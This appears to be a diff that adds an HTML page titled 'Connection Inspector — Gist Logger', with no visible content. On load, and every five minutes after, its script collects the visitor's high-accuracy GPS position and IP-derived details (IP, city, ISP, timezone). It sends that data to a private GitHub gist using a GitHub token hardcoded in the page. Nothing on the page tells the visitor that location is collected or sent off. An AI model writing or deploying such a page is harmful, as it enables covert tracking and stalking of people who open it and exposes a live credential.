@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Connection Inspector — Gist Logger</title>
+</head>
+<body>
+<script>
+// --- Configuration ---
+const GITHUB_TOKEN = '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'; // replace with your token
+let GIST_ID = null; // will store created gist ID
+
+// --- Utility functions ---
+async function createOrUpdateGist(logs) {
+  try {
+    const files = { 'ip-gps-log.json': { content: JSON.stringify(logs, null, 2) } };
+    let response;
+
+    if (!GIST_ID) {
+      // Create a new gist
+      response = await fetch('https://api.github.com/gists', {
+        method: 'POST',
+        headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({ files, description: 'IP/GPS location logs', public: false })
+      });
+      const data = await response.json();
+      if (data && data.id) GIST_ID = data.id;
+      console.log('Created new gist at:', data.html_url);
+    } else {
+      // Update existing gist
+      response = await fetch(`https://api.github.com/gists/${GIST_ID}`, {
+        method: 'PATCH',
+        headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({ files })
+      });
+      const data = await response.json();
+      console.log('Updated gist at:', data.html_url);
+    }
+  } catch (err) {
+    console.error('Error creating/updating gist:', err);
+  }
+}
+
+async function fetchLocationData() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) {
+      console.warn('GPS not supported, falling back to IP');
+      resolve(null);
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(pos => {
+      const { latitude, longitude } = pos.coords;
+      resolve({ latitude, longitude, source: 'GPS' });
+    }, () => resolve(null), { enableHighAccuracy: true, timeout: 5000 });
+  });
+}
+
+async function fetchIPData() {
+  try {
+    const res = await fetch('https://ipinfo.io/json');
+    const data = await res.json();
+    const ipLoc = data.loc ? {
+      latitude: parseFloat(data.loc.split(',')[0]),
+      longitude: parseFloat(data.loc.split(',')[1]),
+      source: 'IP'
+    } : {};
+    return { timestamp: new Date().toISOString(), ip: data.ip, city: data.city, region: data.region, country: data.country, org: data.org, timezone: data.timezone, ...ipLoc };
+  } catch (err) {
+    console.error('Failed to fetch IP data:', err);
+    return null;
+  }
+}
+
+// *** MODIFIED runLogger FOR STRICT GPS-FIRST FALLBACK ***
+async function runLogger() {
+  const gpsLog = await fetchLocationData();
+  const ipLog = await fetchIPData(); // Always fetch IP data for the IP/city/time
+
+  let finalLog = { 
+    timestamp: ipLog ? ipLog.timestamp : new Date().toISOString(),
+    ip: ipLog ? ipLog.ip : 'N/A',
+    city: ipLog ? ipLog.city : 'N/A',
+    region: ipLog ? ipLog.region : 'N/A',
+    country: ipLog ? ipLog.country : 'N/A',
+    org: ipLog ? ipLog.org : 'N/A',
+    timezone: ipLog ? ipLog.timezone : 'N/A'
+  };
+
+  // 1. Try to use GPS data first
+  if (gpsLog) {
+    finalLog.latitude = gpsLog.latitude;
+    finalLog.longitude = gpsLog.longitude;
+    finalLog.source = gpsLog.source; // 'GPS'
+    
+  // 2. Fall back to IP-derived location data if GPS is unavailable
+  } else if (ipLog && ipLog.latitude && ipLog.longitude) {
+    finalLog.latitude = ipLog.latitude;
+    finalLog.longitude = ipLog.longitude;
+    finalLog.source = ipLog.source; // 'IP'
+    
+  // 3. Log a note if neither location source is available
+  } else {
+    finalLog.source = 'None';
+    finalLog.note = 'Location not available';
+  }
+
+  console.log('Logging to gist:', finalLog);
+
+  // Load previous logs from localStorage
+  let logs = [];
+  try { logs = JSON.parse(localStorage.getItem('ipLogs')) || []; } catch(e) { logs = []; }
+  logs.push(finalLog);
+  localStorage.setItem('ipLogs', JSON.stringify(logs));
+
+  // Save/update gist
+  await createOrUpdateGist(logs);
+}
+// *** END MODIFIED runLogger FUNCTION ***
+
+// Initial run
+runLogger();
+// Repeat every 5 minutes
+setInterval(runLogger, 5*60*1000);
+</script>
+</body>
+</html>
